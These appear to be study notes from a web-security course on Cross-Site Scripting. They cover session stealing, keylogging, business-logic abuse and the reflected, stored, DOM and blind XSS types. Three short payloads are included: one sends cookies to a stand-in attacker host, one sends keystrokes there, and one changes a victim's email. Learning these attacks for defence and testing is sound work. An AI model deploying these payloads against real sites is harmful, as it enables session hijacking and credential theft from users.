- Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

## ==Session Stealing==

- Details of a user's session, such as login tokens, are often kept in cookies on the targets machine.

```JavaScript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

## ==Key Logger==

- This means anything you type on the webpage will be forwarded to a website under the hacker's control.

```JavaScript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

## ==Business Logic==

- This would be about calling a particular network resource or a JavaScript function.

```JavaScript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

## ==Reflected XSS==

- The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to ==**execute code on their browser, potentially revealing session or customer information.**==
- Need to test every possible point of entry; these include:
    - Parameters in the URL Query String
    - URL File Path
    - Sometimes HTTP Headers (although unlikely exploitable in practice)

## ==Stored XSS==

- The malicious JavaScript could redirect users to another site, **==steal the user's session cookie, or perform other website actions while acting as the visiting user.==**

## ==DOM Based XSS==

- DOM Based XSS is where the JavaScript execution happens directly in the ==**browser without any new pages being loaded or data submitted to backend code.**==
- The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section.

## ==Blind XSS==

- Is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, ==**you can't see the payload working or be able to test it against yourself first.**==
- Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, **==the staff member's cookies, and even the contents of the portal page that is being viewed.==**

## Polyglot

- An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.
